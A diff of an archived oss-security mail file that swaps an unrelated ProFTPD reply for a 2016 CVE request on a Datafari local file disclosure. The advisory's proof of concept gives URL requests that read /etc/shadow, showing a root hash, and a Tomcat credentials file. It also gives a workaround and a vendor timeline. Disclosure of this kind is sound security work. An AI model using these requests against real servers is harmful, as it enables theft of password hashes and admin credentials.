@@ -1,32 +1,70 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/03/11/15
-Message-ID: <20160311175634.19159812@pc1>
-Date: Fri, 11 Mar 2016 17:56:34 +0100
-From: Hanno Böck <hanno@...eck.de>
-To: cve-assign@...re.org, oss-security@...ts.openwall.com
-Subject: Re: ProFTPD before 1.3.5b/1.3.6rc2 uses 1024 bit Diffie Hellman parameters for TLS even if user sets manual parameters
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/03/4
+Message-ID: <A029BE905CDA9E49AF495A6ADB7F71A7D46E8CFB@SEATTLE.lexsi.lan>
+Date: Wed, 3 Feb 2016 15:55:07 +0000
+From: PASCAULT Wilfried <wpascault@...si.com>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: CVE Request: Datafari Local File Disclosure
 Content-Type: text/plain; charset=utf-8
 
-On Fri, 11 Mar 2016 11:49:48 -0500 (EST)
-cve-assign@...re.org wrote:
+Datafari, an Open source enterprise search software using Apache Solr, ManifoldCF and Tomcat is proned to a local file disclosure vulnerability.
 
-> > The release notes[1] are confusing, as they mention only problems
-> > with keys smaller than 2048 bit, but I was also able to reproduce
-> > this issue with 4096 bit keys.
-> > [1] http://proftpd.org/docs/RELEASE_NOTES-1.3.5b  
-> 
-> We are not sure why this would be confusing.
+Product's information
+---------------------
+* Name : Datafari - http://www.datafari.com/
+* Editor: France Labs
+* Affected versions: 2.x<2.1.3
+* Tested : 2.1.0 and 2.1.1 on Debian Wheezy 7 and Jesse 8
 
-Yes, I also noted now that this refers to an unrelated issue.
+Description
+-----------
+When "filesystem" repository has been configured into Datafari (administrative privileges on Datafari required), a user could access to any file of the system with root privileges.
 
-The DH issue was not mentioned in the release notes at first, now the
-author has changed that.
+On "$INSTALLPATH$/datafari/tomcat/conf/datafari.properties" configuration file, "ALLOWLOCALFILEREADING" parameter allows by default to read file on system.
 
--- 
-Hanno Böck
-https://hboeck.de/
+Datafari is by default running as user root, so any file could be downloaded with "url=file:/" parameter in "/Datafari/URL" (token isn't checked).
 
-mail/jabber: hanno@...eck.de
-GPG: BBB51E42
+This issue is exploitable only when "Filesystem" repository has been set on ManifoldCF.
 
-Content of type "application/pgp-signature" skipped
+Proof of concept
+----------------
+http://localhost:8080/Datafari/URL?url=file:/arbitrary_file
+
+http://localhost:8080/Datafari/URL?url=file:/etc/shadow
+=> file will be downloaded as _etc_shadow
+
+$ head _etc_shadow
+root:$6$nTTh32TT$rLqcSGDf92tyh9aXtuTqnlGW4Ewr.IzBEcdP/kMnvhNYELz7iUgmOyiWesbJRUwEeKdKk/2yQcnAVBQYBGsiD.:16714:0:99999:7:::
+daemon:*:16714:0:99999:7:::
+bin:*:16714:0:99999:7:::
+sys:*:16714:0:99999:7:::
+sync:*:16714:0:99999:7:::
+games:*:16714:0:99999:7:::
+man:*:16714:0:99999:7:::
+lp:*:16714:0:99999:7:::
+mail:*:16714:0:99999:7:::
+news:*:16714:0:99999:7:::
+
+another funny file ^_^ (Tomcat manager password could not be changed during installation)
+http://localhost:8080/Datafari/URL?url=file://opt/datafari/tomcat/conf/tomcat-users.xml
+$ cat _opt_datafari_tomcat_conf_tomcat-users.xml|grep admin
+  <user password="@PASSWORD@" roles="manager-gui,SearchAdministrator" username="admin"/>
+
+http://localhost:8080/manager/html/list
+
+
+Workaround
+----------
+Set "ALLOWLOCALFILEREADING=false" on "$INSTALLPATH$/datafari/tomcat/conf/datafari.properties" and restart Datafari
+
+Timeline
+--------
+1/6/2016: reported to vendor
+1/11/2016: vendor response but said was not a security issue
+1/11/2016: add technical details and POC
+1/11/2016: vendor acknowledged as a security issue
+1/11/2016: patch was commited in master branch
+1/28/2016: 2.1.3 released
+
+Thanks to Cédric and Aurélien from Datafari project for their quick replies.
+
